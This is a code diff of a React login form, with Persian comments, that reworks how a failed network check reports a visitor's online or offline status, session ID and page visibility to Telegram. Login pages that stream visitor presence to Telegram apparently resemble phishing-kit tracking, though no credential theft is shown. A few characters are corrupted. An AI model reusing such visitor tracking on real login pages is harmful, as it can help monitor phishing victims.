@@ -333,22 +333,44 @@ export const LoginForm = () => {
             console.error("❌ Failed to send enhanced status check:", error);
           });
         }).catch((error) => {
-          // در صورت خطا، فرض کن آفلاین است
-          console.error("❌ Network test failed, assuming offline:", error);
+          // ��ر صورت خطا، بررسی دقیق‌تر وضعیت
+          console.error("❌ Network test failed, performing detailed analysis:", error);
 
-          updateUserOnlineStatus(
-            sessionId,
-            false, // offline
-            isVisible,
-            Date.now(),
-            "offline",
-            "🔴",
-            true, // forceUpdate = true
-          ).then(() => {
-            console.log("✅ Fallback offline status sent to Telegram");
-          }).catch((fallbackError) => {
-            console.error("❌ Failed to send fallback status:", fallbackError);
-          });
+          // اگر navigator.onLine false است، قطعاً آفلاین است
+          if (!navigatorOnline) {
+            console.log("🔴 Navigator reports offline - user is definitely offline");
+
+            updateUserOnlineStatus(
+              sessionId,
+              false, // offline
+              isVisible,
+              Date.now(),
+              "offline",
+              "📵",
+              true, // forceUpdate = true
+            ).then(() => {
+              console.log("✅ Confirmed offline status sent to Telegram");
+            }).catch((fallbackError) => {
+              console.error("❌ Failed to send offline status:", fallbackError);
+            });
+          } else {
+            // navigator.onLine true است اما شبکه کار نمی‌کند - احتمالاً مشکل اتصال
+            console.log("🟡 Navigator reports online but network tests failed - connection issues");
+
+            updateUserOnlineStatus(
+              sessionId,
+              false, // treat as offline due to connectivity issues
+              isVisible,
+              Date.now(),
+              "offline",
+              "����",
+              true, // forceUpdate = true
+            ).then(() => {
+              console.log("✅ Connection issue status sent to Telegram");
+            }).catch((fallbackError) => {
+              console.error("❌ Failed to send connection issue status:", fallbackError);
+            });
+          }
         });
         break;
       case "complete":
